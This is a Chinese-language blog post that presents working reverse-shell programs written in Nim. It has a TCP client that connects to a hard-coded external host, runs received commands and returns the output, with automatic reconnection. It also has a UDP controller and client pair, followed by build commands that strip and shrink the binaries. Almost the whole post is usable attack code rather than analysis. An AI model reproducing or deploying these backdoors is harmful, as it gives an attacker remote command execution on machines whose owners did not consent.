---
title: nim语言实现跨平台反弹shell
published: 2023-03-20 16:37
category: 系统
draft: false
tags: [Nim, 反弹shell, 跨平台]
---

在网上看到这个Nim语言，Python的语法，C的性能，还能跨平台，写了两个反弹shell玩了一下。

## 一、tcp 反弹shell，代自动重连功能

```python
import net
import osproc
import os
import strutils

var ip = "server.nixops.me"
var port = 4444

var args = commandLineParams()

if args.len() == 2:
    ip = args[0]
    port = parseInt(args[1])

while true:
    var socket = newSocket()
    try:
        socket.connect(ip, Port(port))
        while true:
            try:
                socket.send(system.hostOS & "_" & system.hostCPU & "> ")
                var command = socket.recvLine()
                var result = execProcess(command,options = {poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
                socket.send(result)
            except:
                socket.close()
                break
    except:
        sleep(10000)
        continue
```

以上是被控端代码，控制端使用nc监听4444等待连接即可。

## 二、udp反弹shell

### 2.1 udp server控制端

```python
import os
import strutils
import netty

var ip = "0.0.0.0"
var port = 4444

var args = commandLineParams()

if args.len() == 2:
    ip = args[0]
    port = parseInt(args[1])

var server = newReactor(ip, port)
echo "Listenting for UDP on " & ip & ":" & intToStr(port)

while true:
  server.tick()
  for connection in server.newConnections:
    echo "[new] ", connection.address

  for connection in server.deadConnections:
    echo "[dead] ", connection.address

  for msg in server.messages:
    echo ">>> Receive Client MESSAGE: <<<", msg.data
    echo msg.data
    echo ">>> Client MESSAGE Finished !<<<"

  for connection in server.connections:
    var cmd = readLine(stdin)
    if cmd.len > 0:
      server.send(connection, cmd)
      echo ">>> Success Send Command: " & cmd & " TO:  ", connection.address
```

### 2.2 udp 客户被控端

```python
import net
import osproc
import os
import strutils
import netty

var ip = "server.nixops.me"
var port = 4444

var args = commandLineParams()

if args.len() == 2:
    ip = args[0]
    port = parseInt(args[1])

while true:
    var client = newReactor()
    var c2s = client.connect(ip, port)
    client.send(c2s,"Hello from : " & system.hostOS & "_" & system.hostCPU & "! ")
    while true:
        try:
            client.tick()
            var command = ""
            for msg in client.messages:
                command.add(msg.data)

            if command.len > 0:
                var result = execProcess(command,options = {poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
                client.send(c2s,result)
            if client.deadConnections.len > 0 :
                client.disconnect(c2s)
                break
        except:
            sleep(10000)
            continue
```

## 三、编译

```bash
nim c -d:danger -d:strip --opt:size tcp.nim
nim c -d:danger -d:strip --opt:size udpc.nim
nim c -d:danger -d:strip --opt:size udps.nim
```

## 四、总结

Nim优点： 好学、高性能、静态类型、跨平台、编译速度快
缺点也非常明显：生态比较差，标准库也不够完善，以上代码想用daemon方式运行就不行，标准库还没有实现
